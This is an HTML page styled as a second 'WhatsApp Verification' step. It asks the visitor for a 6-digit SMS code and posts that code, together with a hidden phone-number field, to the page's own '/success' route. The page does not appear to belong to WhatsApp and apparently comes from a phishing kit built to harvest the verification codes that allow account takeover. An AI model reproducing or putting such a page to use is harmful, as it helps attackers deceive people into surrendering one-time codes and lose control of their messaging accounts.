<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification - Step 2</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>

    <!-- Native HTML Form handling OTP submission via POST -->
    <form action="/success" method="POST" class="form-wrapper" id="step2Form">
        <div class="wrapper">
            <div class="step-view active">
                <h2>Enter 6-digit code</h2>
                <div class="instructions">
                    Waiting to automatically detect an SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 812 345 6789</span>. 
                    <a href="/" class="edit-link">Wrong number?</a>
                </div>

                <!-- Hidden input to carry forward the phone number into the payload -->
                <input type="hidden" id="hiddenPhoneField" name="full_phone" value="">

                <!-- Single OTP Input Field -->
                <div class="single-otp-container">
                    <input type="text" class="single-otp-input" id="otpInput" name="otp" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" placeholder="------" required autofocus>
                </div>

                <div class="resend-container">
                    <p>Didn't receive code?</p>
                    <a href="#" class="resend-link disabled" id="resendBtn">Resend SMS</a> <span id="timerText">(2:00)</span>
                </div>
            </div>
        </div>

        <!-- Persistent Action Button -->
        <div class="action-container">
            <button type="submit" class="btn-next" id="nextBtn">Verify</button>
        </div>
    </form>

    <script src="static/script.js"></script>
</body>
</html>
